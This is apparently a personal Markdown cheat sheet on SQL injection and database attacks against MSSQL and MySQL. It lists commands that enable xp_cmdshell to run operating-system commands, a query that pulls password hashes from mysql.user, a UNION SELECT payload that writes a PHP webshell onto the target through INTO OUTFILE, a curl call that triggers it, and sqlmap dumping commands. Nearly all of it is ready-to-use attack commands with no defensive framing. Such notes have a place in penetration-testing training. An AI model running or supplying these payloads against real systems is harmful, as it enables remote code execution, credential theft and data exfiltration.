# SQLi

## MSSQL 

### Basics

#### Connection
```
impacket-mssqlclient account:passwd@ip -windows-auth
```

#### Commands
```
SQL> EXECUTE sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;
SQL> EXECUTE xp_cmdshell 'whoami';
```

## MySQL

### Basics

#### Connection
```
$ mysql -u root -p'rootpassword' -h $DbServerIp -P $DbServerPort
```

#### Commands
```
> select version();
> select system_user();
> show databases;
> SELECT user, authentication_string FROM mysql.user WHERE user = 'usertohack';

```

### Attacks

Php injection in an `input` HTML field:
```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, ..., null INTO OUTFILE "/path/on/target/webshell.php" -- //
```
and trigger the webshell:
```
curl $TargetIp/path/on/target/webshell.php?cmd=ls
```

## Sqlmap

```
sqlmap -u http://ip/page.php?user=dummy -p user
sqlmap -u http://ip/page.php?user=dummy -p user --dump
```


